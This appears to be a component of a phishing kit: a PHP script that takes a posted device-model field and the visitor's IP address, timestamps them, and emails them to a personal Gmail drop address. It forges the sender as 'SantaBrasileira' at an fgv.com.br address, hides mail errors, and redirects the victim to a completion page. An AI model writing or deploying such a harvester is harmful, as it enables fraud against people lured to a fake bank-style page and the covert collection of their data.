<?php
$ip = $_SERVER["REMOTE_ADDR"];
date_default_timezone_set('America/Sao_Paulo');
$data=date("d/m/Y");
$hora=date("H:i");
$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: SantaBrasileira <contato@fgv.com.br>";
$modelo = $_POST["modelo"];
$conteudo = "
------------------ Dados -------------------<br>
$data-($hora) - $ip<br>
|\nModeloAparelho: $modelo<br>
--------------------------------------------<br>";
header( 'Location: done.php' ) ;
@mail("totaxtrade@gmail.com", "$ip", "$conteudo", $headers);
?>